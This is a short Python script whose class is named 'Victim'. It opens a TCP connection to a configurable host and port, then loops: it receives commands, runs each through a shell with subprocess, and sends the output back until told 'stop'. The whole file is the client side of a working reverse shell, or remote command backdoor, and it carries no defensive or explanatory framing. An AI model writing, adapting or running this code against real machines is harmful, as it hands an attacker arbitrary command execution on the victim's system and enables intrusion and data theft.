import socket
import subprocess



class Victim:
    def __init__(self,host = socket.gethostbyname(socket.gethostname()), port = 5050):
        self.ADDR = (host, port)
        self.FORMAT = 'utf-8'
        self.DISCONNECTED_MESSAGE = "stop"
        self.HEADER = 4096
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client_socket.connect(self.ADDR)


    def listen_send_and_commit_command(self):

        while True:

            command = self.client_socket.recv(self.HEADER).decode(self.FORMAT)
            if command.lower() == self.DISCONNECTED_MESSAGE:
                print("[DISCONNECTED]")
                break

            print(f"[COMMAND RECEIVED] {command}")

            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)

            except subprocess.CalledProcessError as e:
                output = e.output

            if output == "":
                print("[EMPTY] output is empty")
                output = "[EMPTY] output is empty"

            self.client_socket.send(output.encode(self.FORMAT))


        self.client_socket.close()

if __name__ == "__main__":
    victim = Victim()
    victim.listen_send_and_commit_command()












